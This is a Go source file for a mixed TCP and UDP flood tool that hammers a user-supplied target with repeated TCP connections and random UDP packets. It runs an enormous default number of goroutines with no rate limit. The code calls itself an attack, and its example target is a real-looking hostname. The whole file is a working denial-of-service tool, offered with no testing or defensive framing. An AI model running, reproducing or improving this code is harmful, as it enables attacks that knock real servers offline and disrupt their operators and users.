
package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

var (
	target     string
	tcpThreads int
	udpThreads int
	tcpRate    int
	udpRate    int
	udpSize    int
	verbose    bool
)

func init() {
	flag.StringVar(&target, "target", "", "Target IP:port (e.g., 	vps.lpnodes.qzz.io:443)")
	flag.IntVar(&tcpThreads, "tcp-threads", 999999999999999999, "Number of TCP goroutines")
	flag.IntVar(&udpThreads, "udp-threads", 99999999999999999, "Number of UDP goroutines")
	flag.IntVar(&tcpRate, "tcp-rate", 0, "TCP packets per second per thread (0 = unlimited)")
	flag.IntVar(&udpRate, "udp-rate", 0, "UDP packets per second per thread (0 = unlimited)")
	flag.IntVar(&udpSize, "udp-size", 1024, "UDP payload size (bytes)")
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose logging")
	flag.Parse()

	if target == "" {
		fmt.Println("Target is required. Usage:")
		flag.PrintDefaults()
		os.Exit(1)
	}
}

func tcpFlood(wg *sync.WaitGroup, stopChan <-chan struct{}) {
	defer wg.Done()

	for {
		select {
		case <-stopChan:
			return
		default:
			conn, err := net.DialTimeout("tcp", target, 2*time.Second)
			if err != nil {
				if verbose {
					fmt.Printf("TCP Error: %v\n", err)
				}
				continue
			}
			conn.Close()
			if tcpRate > 0 {
				time.Sleep(time.Second / time.Duration(tcpRate))
			}
		}
	}
}

func udpFlood(wg *sync.WaitGroup, stopChan <-chan struct{}) {
	defer wg.Done()

	conn, err := net.Dial("udp", target)
	if err != nil {
		fmt.Printf("UDP Dial Error: %v\n", err)
		return
	}
	defer conn.Close()

	rand.Seed(time.Now().UnixNano())
	payload := make([]byte, udpSize)

	for {
		select {
		case <-stopChan:
			return
		default:
			rand.Read(payload)
			_, err := conn.Write(payload)
			if err != nil && verbose {
				fmt.Printf("UDP Send Error: %v\n", err)
			}
			if udpRate > 0 {
				time.Sleep(time.Second / time.Duration(udpRate))
			}
		}
	}
}

func main() {
	fmt.Printf("Starting MIXED TCP+UDP Flood on %s\n", target)
	fmt.Printf("TCP Threads: %d | UDP Threads: %d\n", tcpThreads, udpThreads)

	var wg sync.WaitGroup
	stopChan := make(chan struct{})

	// Handle Ctrl+C for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\nStopping attack...")
		close(stopChan)
	}()

	// Launch TCP Attackers
	for i := 0; i < tcpThreads; i++ {
		wg.Add(1)
		go tcpFlood(&wg, stopChan)
	}

	// Launch UDP Attackers
	for i := 0; i < udpThreads; i++ {
		wg.Add(1)
		go udpFlood(&wg, stopChan)
	}

	wg.Wait()
	fmt.Println("Attack stopped.")
}
